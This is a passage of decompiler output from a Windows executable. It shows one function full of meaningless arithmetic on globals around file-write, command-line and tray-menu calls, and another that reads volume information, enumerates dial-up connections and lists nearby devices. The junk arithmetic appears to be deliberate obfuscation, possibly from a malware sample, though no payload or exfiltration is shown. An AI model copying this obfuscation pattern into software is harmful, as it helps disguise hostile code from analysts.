      v22 *= (_DWORD)cpt + v21 * v8 + a3 * v22;
      v15 = c * Y;
      v21 -= a3 + v8;
    }
  }
  return result;
}
// 404423: variable 'v11' is possibly undefined
// 452300: using guessed type int dword_452300;

//----- (00404498) --------------------------------------------------------
int __cdecl sub_404498(int a1)
{
  const WCHAR *CommandLineW; // eax
  BOOL v2; // eax
  struct tagPOINT Point; // [esp+4h] [ebp-8ACh] BYREF
  int v5; // [esp+Ch] [ebp-8A4h]
  int v6; // [esp+10h] [ebp-8A0h]
  int v7; // [esp+14h] [ebp-89Ch]
  int v8; // [esp+18h] [ebp-898h]
  HWND v9; // [esp+1Ch] [ebp-894h]
  HWND hWnd; // [esp+20h] [ebp-890h]
  int v11; // [esp+24h] [ebp-88Ch]
  WPARAM wParam; // [esp+28h] [ebp-888h]
  HDC v13; // [esp+2Ch] [ebp-884h]
  int v14; // [esp+30h] [ebp-880h]
  HMENU hMenu; // [esp+34h] [ebp-87Ch]
  int v16; // [esp+38h] [ebp-878h]
  HWND v17; // [esp+3Ch] [ebp-874h]
  int v18; // [esp+40h] [ebp-870h]
  DWORD v19; // [esp+44h] [ebp-86Ch]
  struct _NOTIFYICONDATAA v20; // [esp+48h] [ebp-868h] BYREF
  LPARAM lParam; // [esp+248h] [ebp-668h]
  DWORD dwPermanentProviderID; // [esp+250h] [ebp-660h]
  int v23; // [esp+254h] [ebp-65Ch]
  int j; // [esp+258h] [ebp-658h]
  int i; // [esp+25Ch] [ebp-654h]
  __int16 v26; // [esp+260h] [ebp-650h]
  char v27[510]; // [esp+262h] [ebp-64Eh] BYREF
  DWORD v28; // [esp+464h] [ebp-44Ch]
  BOOL FileVersionInfoW; // [esp+468h] [ebp-448h]
  int v30; // [esp+488h] [ebp-428h]
  char *v31; // [esp+490h] [ebp-420h]
  DWORD dwMilliseconds; // [esp+4ACh] [ebp-404h]
  BOOL v33; // [esp+4B8h] [ebp-3F8h]
  HANDLE hFile; // [esp+4BCh] [ebp-3F4h]
  RPC_CSTR StringUuid; // [esp+4C0h] [ebp-3F0h] BYREF
  unsigned int v36; // [esp+4C4h] [ebp-3ECh]
  DWORD v37; // [esp+4C8h] [ebp-3E8h]
  int v38; // [esp+4CCh] [ebp-3E4h]
  CHAR MultiByteStr[108]; // [esp+4F8h] [ebp-3B8h] BYREF
  int cbMultiByte; // [esp+564h] [ebp-34Ch]
  struct _OVERLAPPED Overlapped; // [esp+56Ch] [ebp-344h] BYREF
  char Data[264]; // [esp+580h] [ebp-330h] BYREF
  UUID Uuid; // [esp+688h] [ebp-228h] BYREF
  WCHAR WideCharStr[260]; // [esp+698h] [ebp-218h] BYREF
  int pNumArgs; // [esp+8A0h] [ebp-10h] BYREF
  LPCWSTR *v46; // [esp+8A4h] [ebp-Ch]
  DWORD dwLen; // [esp+8ACh] [ebp-4h]

  dwLen = 0;
  dwMilliseconds = (DWORD)hdc;
  hFile = (HANDLE)dword_452300;
  memset(&Overlapped, 0, sizeof(Overlapped));
  memset(WideCharStr, 0, 512);
  v26 = 0;
  memset(v27, 0, sizeof(v27));
  dword_452070 = 198 - (unsigned __int16)cpt - byte_451AB2 - 21;
  if ( dword_452078 > dword_452064 )
  {
    dword_451774 += (unsigned __int16)dword_452310 * HIWORD(dword_45206C);
    c *= 177 - 170 * (unsigned __int8)dword_452078;
    dword_451BA0 -= (int)cpt + dword_452090;
    dword_452070 *= (unsigned int)dword_452310 & (dword_452064 + 11);
  }
  if ( dword_45232C == dword_45207C )
  {
    dword_452064 -= dword_452300 * BYTE1(dword_452318) - c + dword_452314 + 220;
    dword_451BA4 -= dword_451B98 * ((_DWORD)(cpt + 61) << 24);
  }
  else if ( (_UNKNOWN *)y == &unk_4521B8 )
  {
    nIDDlgItem <<= (_BYTE)dword_452310 - 5 * dword_451774;
    dword_451BA4 -= dword_451B9C;
    dword_451884 *= 3 - dword_45230C;
    dword_452090 = BYTE1(dword_451B9C) << dword_451770;
  }
  v36 = 0;
  if ( (int)::hWnd >= dword_452084 )
  {
    dword_451B9C = 247 * nIDDlgItem;
    dword_45208C = dword_452300
                 + (unsigned __int16)hdc * (unsigned __int16)word_4519A2
                 - 16
                 - (unsigned __int16)dword_45208C * byte_451AC1;
    dword_452070 = dword_452088 - 129 - (_DWORD)hdc;
    dword_452064 -= HIWORD(dword_45232C)
                  + BYTE1(::hWnd) * (unsigned __int16)(247 * nIDDlgItem)
                  + 251 * (_DWORD)cpt
                  - 131
                  - dword_452064;
  }
  if ( dword_452318 > dword_45208C )
  {
    dword_451770 <<= dword_452064 * dword_452084 * dword_452090;
    Y = c - 59;
    dword_452090 <<= dword_45208C + y;
  }
  dword_451B94 += (int)BYTE1(dword_452314) >> dword_451B9C;
  v30 = a1;
  for ( i = 0; i < 185; ++i )
  {
    dword_451774 -= (dword_452084 + dword_45232C) & (65 - (_DWORD)::hWnd);
    if ( dword_452084 < (int)dword_452068 )
    {
      dword_451BA0 *= byte_4522B5 - (_DWORD)dword_452068 - (unsigned __int16)dword_452300;
      dword_451B9C = dword_452080;
      dword_451BA0 -= HIBYTE(word_451DD4) + 13566 * Y + 2;
    }
    if ( dword_452084 >= (int)::hWnd )
    {
      if ( (int)dword_452068 >= dword_45230C )
      {
        dword_452070 *= (212 * (unsigned __int16)word_451A5C) & ((dword_452090 + 105 - dword_451BA4)
                                                               * dword_451B94
                                                               * dword_45230C);
        nIDDlgItem *= dword_45232C * dword_452080 + dword_452318 - 95 * dword_452080;
      }
    }
    else
    {
      dword_451B94 = dword_452300 >> (dword_451884 * BYTE2(dword_4521AC) - 118 * dword_452070) << (nIDDlgItem + Y);
    }
  }
  v31 = Data;
  dword_451B98 += 238 - dword_452074 * (_DWORD)cpt;
  if ( dword_45207C > dword_451B94 )
    nIDDlgItem = byte_4517F4
               - (dword_452308 & ((unsigned int)::hWnd
                                + (unsigned __int8)dword_452318
                                - nIDDlgItem
                                + dword_45230C
                                + dword_451774));
  if ( dword_452300 < (int)hdc )
    dword_451884 = (int)::hWnd + (_DWORD)dword_452068 + 132;
  dword_451884 = HIWORD(cpt) + (unsigned __int8)(byte_451FFA >> 7) + dword_452084 + 88;
  Overlapped.hEvent = CreateEventW(0, 1, 0, 0);
  if ( (CHAR *)dword_452074 == FileName )
  {
    dword_451770 *= ((int)dword_452310 + BYTE1(dword_452090) - 154) << 23;
    dword_45230C *= byte_451FD2 + (unsigned __int8)dword_451B9C - dword_451770 + 129;
    dword_452318 = dword_45232C + 242;
  }
  if ( dword_45230C >= dword_452318 )
  {
    dword_452078 *= (y - dword_452308) >> (dword_45207C * (dword_452074 + dword_452318) - 117);
    y = 13359;
  }
  if ( dword_45206C > dword_452090 )
  {
    dword_45230C = dword_451BA0 * dword_45206C * HIWORD(dword_452080);
    y = 72 - HIWORD(dword_451B98);
    dword_451884 = 138;
    dword_452084 <<= 33 * c;
  }
  v37 = dwLen;
  dword_451BA0 &= dword_45230C - dword_45207C * nIDDlgItem;
  v28 = dwLen + 1;
  c = 246 - dword_4521AC - 253;
  y = (unsigned __int16)word_451950 + 5490 * dword_45207C;
  v33 = WriteFile(dword_452310, FileName, (DWORD)cpt + (_DWORD)hdc, 0, &Overlapped);
  dword_451BA0 = (unsigned __int8)dword_45207C << (dword_45206C * (_BYTE)hdc);
  if ( (int)hdc >= (int)&unk_451F60 )
  {
    if ( (_UNKNOWN *)dword_451774 == &unk_4521B8 )
    {
      dword_452084 += (_DWORD)cpt * 222 * dword_452074 + 129;
      dword_451B94 = 0;
    }
  }
  else
  {
    c = (unsigned __int16)::hWnd - (HIWORD(dword_452318) + 6755 - dword_452314);
  }
  if ( dword_452314 >= dword_452094 )
    dword_452080 = Y + dword_452070;
  if ( dword_451B98 < dword_4521AC )
  {
    dword_451770 = (24 * (174 - (int)dword_452310 - 132 * dword_451B98 - dword_452064)) >> dword_452080;
    c = (dword_452064 + 47 * byte_452241 - 134) << dword_451B94;
    dword_452090 = 0;
  }
  if ( dword_45232C != dword_452090 )
  {
    dword_45230C = dword_452318 * BYTE1(dword_452094);
    dword_451BA4 = dword_451BA0 + 92 - dword_452314 + 145 * dword_452088;
    dword_452088 += BYTE1(dword_451B98) * ((unsigned int)dword_452310 & ((unsigned int)cpt + dword_45232C))
                  + (_DWORD)hDlg * (unsigned __int16)dword_452300;
  }
  dword_452088 += (nIDDlgItem + dword_452078) >> (dword_452074 + dword_451B9C - dword_451BA4);
  if ( WaitForSingleObject(Overlapped.hEvent, dwMilliseconds) )
  {
    v33 = CancelIoEx(hFile, &Overlapped);
    if ( (int)&unk_451F60 <= (int)&unk_451BA8 )
    {
      dword_451774 = c + dword_451B9C * byte_451FEE - 123 - dword_452314;
      y = nIDDlgItem * 29610 * dword_451B98 - dword_45207C;
      dword_452088 = Y << (byte_4521E3 * y * dword_452088 + 25);
      dword_451BA0 &= dword_452070 + dword_452090 - dword_451BA4 + 233 * (unsigned __int16)dword_452080;
    }
  }
  if ( FileVersionInfoW )
    y = 0;
  dword_452070 = dword_452090;
  for ( j = 0; j < 44; ++j )
  {
    if ( dword_452318 > (int)hDlg )
    {
      nIDDlgItem >>= dword_452308;
      dword_451774 &= 241 - dword_45208C;
      dword_451B94 >>= -2 * (_BYTE)hdc * -28 * dword_452094;
    }
    if ( (_UNKNOWN *)dword_452088 == &unk_451BA8 )
    {
      dword_451B94 = y * (unsigned __int8)dword_452068 + dword_452084 + 54;
      dword_451B9C = 184 * (_DWORD)dword_452068;
      dword_452318 += (unsigned __int16)nIDDlgItem
                    + dword_452318
                    * (unsigned __int8)((unsigned __int16)(y * (unsigned __int8)dword_452068 + dword_452084 + 54) >> 8);
      dword_452318 &= nIDDlgItem + BYTE1(dword_452070);
    }
    if ( dword_452300 < dword_451774 )
      dword_451770 *= dword_45207C - (unsigned __int16)word_4518E2;
    if ( (HDC)dword_45232C == hdc )
    {
      c = (int)dword_452068 + ((dword_452314 - 225) & (c - dword_452078));
    }
    else if ( dword_452064 <= dword_451B9C )
    {
      dword_452084 -= dword_45207C - dword_452080;
    }
  }
  UuidCreate(&Uuid);
  dword_451B94 &= 0x1D2u;
  v46 = 0;
  dword_451770 = (unsigned __int16)dword_45208C + 335;
  CommandLineW = GetCommandLineW();
  v46 = (LPCWSTR *)CommandLineToArgvW(CommandLineW, &pNumArgs);
  dword_452074 = (int)cpt + dword_452088 - HIWORD(dword_45208C) - 30;
  FileVersionInfoW = GetFileVersionInfoW(*v46, 0, dwLen, Data);
  v38 = y;
  cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, WideCharStr, -1, 0, 0, 0, 0);
  if ( (int)hdc >= 0 )
  {
    y += 570;
    v37 = (DWORD)hdc + dwLen;
  }
  else
  {
    nIDDlgItem += 587;
    UuidToStringA(&Uuid, &StringUuid);
    if ( !cbMultiByte )
      c = 0;
    hdc = 0;
  }
  WideCharToMultiByte(0xFDE9u, 0, WideCharStr, -1, MultiByteStr, cbMultiByte, 0, 0);
  dword_452314 += 100 * ((_DWORD)hdc + 18);
  v36 /= dwLen + 1;
  cpt = hdc;
  dwPermanentProviderID = 0;
  v8 = 1;
  v16 = a1;
  v19 = dwLen;
  v17 = hDlg;
  v6 = 150;
  v14 = 6;
  v7 = 0;
  v23 = 0;
  v11 = 0;
  v18 = 1;
  v9 = ::hWnd;
  v13 = hdc;
  wParam = nIDDlgItem;
  dword_452310 = (HANDLE)GetLastError();
  lParam = y;
  hWnd = GetDlgItem(hDlg, nIDDlgItem);
  Y = 150;
  if ( v13 == (HDC)2 )
    IsWindowVisible(hDlg);
  Y = (v7 + 1) * ((_DWORD)v17 + 2);
  dword_45206C = lineConfigProvider(hDlg, dwPermanentProviderID);
  if ( hDlg )
    ShowWindow(hWnd, 0);
  nIDDlgItem += y - v23;
  if ( hdc )
    ShowWindow(hWnd, 0);
  hMenu = CreatePopupMenu();
  nIDDlgItem = dword_45232C * ((_DWORD)hDlg + v6);
  y = (v16 - (v14 + 1)) * (v7 + Y);
  AppendMenuA(hMenu, 0, Y, "Exit!");
  if ( hdc )
    SetForegroundWindow(hWnd);
  y *= v14 + c - v23 + 2 * (_DWORD)dword_452310 - (_DWORD)v17 + 10;
  GetCursorPos(&Point);
  dwPermanentProviderID *= dword_45230C * ((_DWORD)cpt + 25) + v16 - Y;
  v2 = TrackPopupMenu(hMenu, 0x180u, Point.x, Point.y, 0, v9, 0);
  dword_452308 = v2 + 8 * v16 + 78;
  SendMessageA(v9, 0, 0, 0);
  dword_452310 = (char *)dword_452310 + dword_452314 + dwPermanentProviderID * v16;
  if ( v5 == nIDDlgItem )
  {
    v19 += v6 + dword_45230C + 4 * v7 + 10 - (_DWORD)v17;
    if ( v11 )
      Shell_NotifyIconA(2u, &v20);
  }
  dword_452300 = (int)dword_452310;
  v8 *= v14 + 4 - y * v7;
  DefWindowProcA(v9, 0x84u, wParam, lParam);
  return 0;
}
// 405349: conditional instruction was optimized away because %var_8A0.4==96
// 405396: conditional instruction was optimized away because %var_870.4==1
// 40545A: conditional instruction was optimized away because %var_870.4==1
// 451770: using guessed type int dword_451770;
// 451774: using guessed type int dword_451774;
// 4517F4: using guessed type char byte_4517F4;
// 451884: using guessed type int dword_451884;
// 4518E2: using guessed type __int16 word_4518E2;
// 451950: using guessed type __int16 word_451950;
// 4519A2: using guessed type __int16 word_4519A2;
// 451A5C: using guessed type __int16 word_451A5C;
// 451AB2: using guessed type char byte_451AB2;
// 451AC1: using guessed type char byte_451AC1;
// 451B94: using guessed type int dword_451B94;
// 451B98: using guessed type int dword_451B98;
// 451B9C: using guessed type int dword_451B9C;
// 451BA0: using guessed type int dword_451BA0;
// 451BA4: using guessed type int dword_451BA4;
// 451DD4: using guessed type __int16 word_451DD4;
// 451FD2: using guessed type char byte_451FD2;
// 451FEE: using guessed type char byte_451FEE;
// 451FFA: using guessed type char byte_451FFA;
// 452064: using guessed type int dword_452064;
// 45206C: using guessed type int dword_45206C;
// 452070: using guessed type int dword_452070;
// 452074: using guessed type int dword_452074;
// 452078: using guessed type int dword_452078;
// 45207C: using guessed type int dword_45207C;
// 452080: using guessed type int dword_452080;
// 452084: using guessed type int dword_452084;
// 452088: using guessed type int dword_452088;
// 45208C: using guessed type int dword_45208C;
// 452090: using guessed type int dword_452090;
// 452094: using guessed type int dword_452094;
// 4521AC: using guessed type int dword_4521AC;
// 4521E3: using guessed type char byte_4521E3;
// 452241: using guessed type char byte_452241;
// 4522B5: using guessed type char byte_4522B5;
// 452300: using guessed type int dword_452300;
// 452308: using guessed type int dword_452308;
// 45230C: using guessed type int dword_45230C;
// 452314: using guessed type int dword_452314;
// 452318: using guessed type int dword_452318;
// 45232C: using guessed type int dword_45232C;
// 404498: using guessed type CHAR MultiByteStr[108];

//----- (004055D5) --------------------------------------------------------
int sub_4055D5()
{
  char v1[24]; // [esp+0h] [ebp-25F4h] BYREF
  SOCKET s; // [esp+18h] [ebp-25DCh]
  int namelen; // [esp+1Ch] [ebp-25D8h]
  int optlen; // [esp+20h] [ebp-25D4h] BYREF
  struct sockaddr name; // [esp+24h] [ebp-25D0h] BYREF
  struct WSAData WSAData; // [esp+34h] [ebp-25C0h] BYREF
  char optval[4]; // [esp+1C8h] [ebp-242Ch] BYREF
  struct tagRASCONNA v8; // [esp+1CCh] [ebp-2428h] BYREF
  DWORD v9; // [esp+1DF0h] [ebp-804h] BYREF
  DWORD v10; // [esp+1DF4h] [ebp-800h] BYREF
  DWORD FileSystemFlags; // [esp+1DF8h] [ebp-7FCh] BYREF
  CHAR FileSystemNameBuffer[260]; // [esp+1DFCh] [ebp-7F8h] BYREF
  BOOL VolumeInformationA; // [esp+1F00h] [ebp-6F4h]
  DWORD MaximumComponentLength; // [esp+1F04h] [ebp-6F0h] BYREF
  UINT uMode; // [esp+1F08h] [ebp-6ECh]
  CHAR VolumeNameBuffer[260]; // [esp+1F0Ch] [ebp-6E8h] BYREF
  LPCSTR lpRootPathName; // [esp+2010h] [ebp-5E4h]
  UINT_PTR v18; // [esp+2064h] [ebp-590h]
  UINT_PTR v19; // [esp+21F0h] [ebp-404h]
  int v20; // [esp+21FCh] [ebp-3F8h]
  int v21; // [esp+2478h] [ebp-17Ch]
  HDC v22; // [esp+2528h] [ebp-CCh]
  int v23; // [esp+2598h] [ebp-5Ch]
  int v24; // [esp+259Ch] [ebp-58h]
  int v25; // [esp+25A4h] [ebp-50h]
  HWND v26; // [esp+25C8h] [ebp-2Ch]
  int v27; // [esp+25F0h] [ebp-4h]

  v27 = 0;
  v26 = hDlg;
  v19 = Y;
  v25 = 0;
  v20 = 60;
  v23 = 0;
  v22 = hdc;
  v21 = dword_452328 + 1;
  v24 = y + nIDDlgItem;
  v18 = c - Y;
  if ( hdc )
  {
    lpRootPathName = FileName;
    uMode = SetErrorMode(1u);
    VolumeInformationA = GetVolumeInformationA(
                           FileName,
                           VolumeNameBuffer,
                           0x100u,
                           0,
                           &MaximumComponentLength,
                           &FileSystemFlags,
                           FileSystemNameBuffer,
                           0x100u);
    SetErrorMode(uMode);
  }
  v9 = 20;
  v10 = 20;
  v8.dwSize = 720;
  RasEnumConnectionsA(&v8, &v10, &v9);
  if ( cpt )
  {
    optlen = 4;
    namelen = 14;
    if ( WSAStartup(0x101u, &WSAData) )
      nIDDlgItem = 0;
    s = socket(6, 2, 1000);
    if ( s != -1 )
    {
      memset(&name, 0, 0xEu);
      name.sa_family = 6;
      if ( bind(s, &name, namelen) != -1 && getsockopt(s, 1000, 16397, optval, &optlen) != -1 )
      {
        while ( *(_DWORD *)optval )
        {
          memset(v1, 0, sizeof(v1));
          *(_DWORD *)v1 = *(_DWORD *)optval - 1;
          optlen = 24;
          if ( getsockopt(s, 1000, 16391, v1, &optlen) != -1 )
          {
            if ( hdc )
              printf(
                FileName,
                (unsigned __int8)v1[4],
                (unsigned __int8)v1[5],
                (unsigned __int8)v1[6],
                (unsigned __int8)v1[7],
                (unsigned __int8)v1[8],
                (unsigned __int8)v1[9],
                (unsigned __int8)v1[10],
                (unsigned __int8)v1[11],
                (unsigned __int8)v1[12],
                (unsigned __int8)v1[13]);
          }
          --*(_DWORD *)optval;
        }
      }
      closesocket(s);
    }
    WSACleanup();
  }
  return 0;
}
// 452328: using guessed type int dword_452328;
// 4055D5: using guessed type CHAR FileSystemNameBuffer[260];
// 4055D5: using guessed type CHAR VolumeNameBuffer[260];

//----- (0040589A) --------------------------------------------------------
int __cdecl sub_40589A(HINSTANCE hInstance)
{
  void *v1; // esp
  double v4; // st7
  LPCSTR v5; // edx
  double v7; // st7
  double v8; // st7
  float v9; // [esp+88h] [ebp-2704h]
  float v10; // [esp+98h] [ebp-26F4h]
  float v11; // [esp+9Ch] [ebp-26F0h]
  double v12; // [esp+B8h] [ebp-26D4h]
  double v13; // [esp+E8h] [ebp-26A4h]
  int v14; // [esp+F0h] [ebp-269Ch]
  float v15; // [esp+108h] [ebp-2684h]
  float v16; // [esp+114h] [ebp-2678h]
  float v17; // [esp+120h] [ebp-266Ch]
  float v18; // [esp+160h] [ebp-262Ch]
  float v19; // [esp+168h] [ebp-2624h]
  int **v20; // [esp+170h] [ebp-261Ch]
  int v21[3]; // [esp+174h] [ebp-2618h] BYREF
  unsigned __int16 *v22; // [esp+180h] [ebp-260Ch]
  void *v23; // [esp+18Ch] [ebp-2600h]
  int v24[18]; // [esp+190h] [ebp-25FCh] BYREF
  char v25; // [esp+1DBh] [ebp-25B1h] BYREF
  char *v26; // [esp+1DCh] [ebp-25B0h]
  float v27; // [esp+1E4h] [ebp-25A8h]
  float v28; // [esp+1E8h] [ebp-25A4h]
  float v29; // [esp+1ECh] [ebp-25A0h]
  int **v30; // [esp+1F8h] [ebp-2594h]
  int v31[3]; // [esp+1FCh] [ebp-2590h] BYREF
  unsigned __int16 *v32; // [esp+208h] [ebp-2584h]
  float v33; // [esp+214h] [ebp-2578h]
  float v34; // [esp+218h] [ebp-2574h]
  HWND v35; // [esp+21Ch] [ebp-2570h] BYREF
  int v36; // [esp+220h] [ebp-256Ch] BYREF
  int v37; // [esp+224h] [ebp-2568h] BYREF
  __int16 v38; // [esp+22Ah] [ebp-2562h] BYREF
  __int16 v39; // [esp+22Ch] [ebp-2560h] BYREF
  __int16 v40; // [esp+22Eh] [ebp-255Eh] BYREF
  char v41[28]; // [esp+230h] [ebp-255Ch] BYREF
  int v42; // [esp+254h] [ebp-2538h]
  int v43; // [esp+258h] [ebp-2534h]
  char v44[28]; // [esp+25Ch] [ebp-2530h] BYREF
  HWND v45; // [esp+278h] [ebp-2514h]
  LONG v46; // [esp+27Ch] [ebp-2510h]
  LONG bottom; // [esp+280h] [ebp-250Ch]
  int v48; // [esp+284h] [ebp-2508h]
  _DWORD v49[6]; // [esp+28Ch] [ebp-2500h] BYREF
  char v50; // [esp+2A7h] [ebp-24E5h] BYREF
  char v51; // [esp+2A8h] [ebp-24E4h] BYREF
  char v52; // [esp+2A9h] [ebp-24E3h] BYREF
  __int16 v53; // [esp+2AAh] [ebp-24E2h] BYREF
  __int16 v54; // [esp+2ACh] [ebp-24E0h] BYREF
  __int16 v55; // [esp+2AEh] [ebp-24DEh] BYREF
  OLECHAR sz[42]; // [esp+2B0h] [ebp-24DCh] BYREF
  GUID rguid; // [esp+304h] [ebp-2488h] BYREF
  int v58; // [esp+314h] [ebp-2478h]
  char OutBuffer[64]; // [esp+318h] [ebp-2474h] BYREF
  int v60; // [esp+358h] [ebp-2434h]
  GEO_ENUMPROC lpGeoEnumProc; // [esp+35Ch] [ebp-2430h]
  DWORD BytesReturned; // [esp+360h] [ebp-242Ch] BYREF
  int v63; // [esp+364h] [ebp-2428h]
  HANDLE hDevice; // [esp+368h] [ebp-2424h]
  HDC v65; // [esp+36Ch] [ebp-2420h]
  HGDIOBJ CompatibleBitmap; // [esp+370h] [ebp-241Ch]
  HDC v67; // [esp+374h] [ebp-2418h]
  HDC v68; // [esp+378h] [ebp-2414h]
  char pv[4]; // [esp+37Ch] [ebp-2410h] BYREF
  int v70; // [esp+380h] [ebp-240Ch]
  int v71; // [esp+384h] [ebp-2408h]
  LPVOID lpvObj; // [esp+394h] [ebp-23F8h] BYREF
  HRESULT v73; // [esp+398h] [ebp-23F4h]
  HANDLE v74; // [esp+39Ch] [ebp-23F0h] BYREF
  HGLOBAL hResData; // [esp+3A0h] [ebp-23ECh]
  __int64 v76; // [esp+3A4h] [ebp-23E8h]
  HGLOBAL hGlobal; // [esp+3ACh] [ebp-23E0h]
  LPSTREAM ppstm; // [esp+3B0h] [ebp-23DCh] BYREF
  HRSRC hResInfo; // [esp+3B4h] [ebp-23D8h]
  CHAR Type[264]; // [esp+3B8h] [ebp-23D4h] BYREF
  CHAR Name[264]; // [esp+4C0h] [ebp-22CCh] BYREF
  HDC v82; // [esp+5C8h] [ebp-21C4h]
  HMODULE v83; // [esp+5CCh] [ebp-21C0h]
  LPWSTR lpWideCharStr; // [esp+5D0h] [ebp-21BCh]
  HDC v85; // [esp+5D4h] [ebp-21B8h]
  int cchWideChar; // [esp+5D8h] [ebp-21B4h]
  CHAR MultiByteStr[380]; // [esp+5E0h] [ebp-21ACh] BYREF
  SIZE_T dwBytes; // [esp+75Ch] [ebp-2030h]
  void *v89; // [esp+760h] [ebp-202Ch]
  HGLOBAL hMem; // [esp+764h] [ebp-2028h]
  LRESULT v91; // [esp+768h] [ebp-2024h]
  unsigned int n; // [esp+76Ch] [ebp-2020h]
  HWND hDlg; // [esp+770h] [ebp-201Ch]
  LPARAM v94; // [esp+774h] [ebp-2018h]
  void *Src; // [esp+778h] [ebp-2014h]
  LPARAM v96; // [esp+77Ch] [ebp-2010h]
  unsigned int v97; // [esp+780h] [ebp-200Ch]
  unsigned int v98; // [esp+784h] [ebp-2008h]
  WPARAM v99; // [esp+788h] [ebp-2004h]
  int nIDDlgItem; // [esp+78Ch] [ebp-2000h]
  HDC v101; // [esp+790h] [ebp-1FFCh]
  HMODULE LibraryA; // [esp+794h] [ebp-1FF8h]
  CHAR String[268]; // [esp+798h] [ebp-1FF4h] BYREF
  HINSTANCE v104; // [esp+8A4h] [ebp-1EE8h]
  struct tagPAINTSTRUCT Paint; // [esp+8A8h] [ebp-1EE4h] BYREF
  struct tagRECT v106; // [esp+8E8h] [ebp-1EA4h] BYREF
  HWND hWndParent; // [esp+8F8h] [ebp-1E94h]
  WPARAM wParam; // [esp+8FCh] [ebp-1E90h]
  UINT Msg; // [esp+900h] [ebp-1E8Ch]
  LPARAM v110; // [esp+904h] [ebp-1E88h]
  UINT_PTR v111; // [esp+958h] [ebp-1E34h]
  UINT_PTR v112; // [esp+ACCh] [ebp-1CC0h]
  int v113; // [esp+AD8h] [ebp-1CB4h]
  int v114; // [esp+D54h] [ebp-1A38h]
  CHAR chText[180]; // [esp+D68h] [ebp-1A24h] BYREF
  HDC v116; // [esp+E1Ch] [ebp-1970h]
  int v117; // [esp+E88h] [ebp-1904h]
  int v118; // [esp+E8Ch] [ebp-1900h]
  int v119; // [esp+E94h] [ebp-18F8h]
  HWND v120; // [esp+EB8h] [ebp-18D4h]
  unsigned __int8 *v121; // [esp+EE0h] [ebp-18ACh]
  unsigned __int8 v122; // [esp+EE6h] [ebp-18A6h]
  unsigned __int8 v123; // [esp+EE7h] [ebp-18A5h]
  unsigned __int8 *v124; // [esp+EE8h] [ebp-18A4h]
  BITMAPINFO pbmi; // [esp+EECh] [ebp-18A0h] BYREF
  void *v126; // [esp+F18h] [ebp-1874h] BYREF
  HGDIOBJ v127; // [esp+F1Ch] [ebp-1870h]
  void *ppvBits; // [esp+F20h] [ebp-186Ch] BYREF
  HGDIOBJ ho; // [esp+F24h] [ebp-1868h]
  HGDIOBJ v130; // [esp+F28h] [ebp-1864h]
  int m; // [esp+F2Ch] [ebp-1860h]
  HDC CompatibleDC; // [esp+F30h] [ebp-185Ch]
  int hDest; // [esp+F34h] [ebp-1858h]
  HDC v134; // [esp+F38h] [ebp-1854h]
  HDC v135; // [esp+F3Ch] [ebp-1850h]
  int hSrc; // [esp+F40h] [ebp-184Ch]
  int wSrc; // [esp+F44h] [ebp-1848h]
  int wDest; // [esp+F48h] [ebp-1844h]
  int x; // [esp+F4Ch] [ebp-1840h]
  int y; // [esp+F50h] [ebp-183Ch]
  int xSrc; // [esp+F54h] [ebp-1838h]
  int v142; // [esp+F58h] [ebp-1834h]
  int ySrc; // [esp+F5Ch] [ebp-1830h]
  HDC hDC; // [esp+F60h] [ebp-182Ch]
  int hDC_4; // [esp+F64h] [ebp-1828h]
  int cWidth; // [esp+F68h] [ebp-1824h]
  HGDIOBJ v147; // [esp+F6Ch] [ebp-1820h]
  HGDIOBJ Pen; // [esp+F70h] [ebp-181Ch]
  char v149; // [esp+F74h] [ebp-1818h] BYREF
  HWND DlgItem; // [esp+F84h] [ebp-1808h]
  int v151; // [esp+F88h] [ebp-1804h]
  int *v152; // [esp+F8Ch] [ebp-1800h]
  char v153[1064]; // [esp+F90h] [ebp-17FCh] BYREF
  BLENDFUNCTION ftn; // [esp+13BCh] [ebp-13D0h]
  HBITMAP hbm; // [esp+13C0h] [ebp-13CCh]
  HGDIOBJ h; // [esp+13C4h] [ebp-13C8h]
  HDC hdcSrc; // [esp+13C8h] [ebp-13C4h]
  HDC hdcDest; // [esp+13CCh] [ebp-13C0h]
  HGDIOBJ v159; // [esp+13D0h] [ebp-13BCh]
  LPBITMAPINFO lpbmi; // [esp+13D4h] [ebp-13B8h]
  UINT_PTR v161; // [esp+1428h] [ebp-1364h]
  UINT_PTR v162; // [esp+1594h] [ebp-11F8h]
  int v163; // [esp+15A0h] [ebp-11ECh]
  int v164; // [esp+181Ch] [ebp-F70h]
  HDC v165; // [esp+18E4h] [ebp-EA8h]
  int v166; // [esp+1950h] [ebp-E3Ch]
  int v167; // [esp+1954h] [ebp-E38h]
  int v168; // [esp+195Ch] [ebp-E30h]
  HWND v169; // [esp+1980h] [ebp-E0Ch]
  IStorage *v170[2]; // [esp+19A8h] [ebp-DE4h] BYREF
  LPARAM lParam[5]; // [esp+19B0h] [ebp-DDCh] BYREF
  void *v172[7]; // [esp+19C4h] [ebp-DC8h] BYREF
  int k; // [esp+19E0h] [ebp-DACh]
  WCHAR pwcsName; // [esp+19E4h] [ebp-DA8h] BYREF
  IStorage *ppstgOpen; // [esp+19E8h] [ebp-DA4h] BYREF
  struct tagRECT v176; // [esp+19ECh] [ebp-DA0h] BYREF
  int *v177; // [esp+19FCh] [ebp-D90h]
  int v178; // [esp+1A00h] [ebp-D8Ch] BYREF
  unsigned int j; // [esp+1A04h] [ebp-D88h]
  unsigned int v180; // [esp+1A08h] [ebp-D84h]
  unsigned int v181; // [esp+1A0Ch] [ebp-D80h]
  int v182; // [esp+1A10h] [ebp-D7Ch]
  int v183; // [esp+1A14h] [ebp-D78h]
  int v184; // [esp+1A18h] [ebp-D74h]
  int v185; // [esp+1A1Ch] [ebp-D70h]
  struct tagPOINT Point; // [esp+1A20h] [ebp-D6Ch] BYREF
  void *v187[6]; // [esp+1A28h] [ebp-D64h] BYREF
  unsigned int v188; // [esp+1A40h] [ebp-D4Ch]
  HINSTANCE v189; // [esp+1A44h] [ebp-D48h]
  int v190; // [esp+1A48h] [ebp-D44h]
  int v191; // [esp+1A4Ch] [ebp-D40h]
  unsigned int v192; // [esp+1A50h] [ebp-D3Ch]
  HANDLE hHandle; // [esp+1A54h] [ebp-D38h]
  unsigned int v194; // [esp+1A58h] [ebp-D34h]
  unsigned int v195; // [esp+1A5Ch] [ebp-D30h]
  int v196; // [esp+1A60h] [ebp-D2Ch]
  int v197; // [esp+1A64h] [ebp-D28h]
  int v198; // [esp+1A68h] [ebp-D24h]
  int v199; // [esp+1A6Ch] [ebp-D20h]
  char v200; // [esp+1A70h] [ebp-D1Ch]
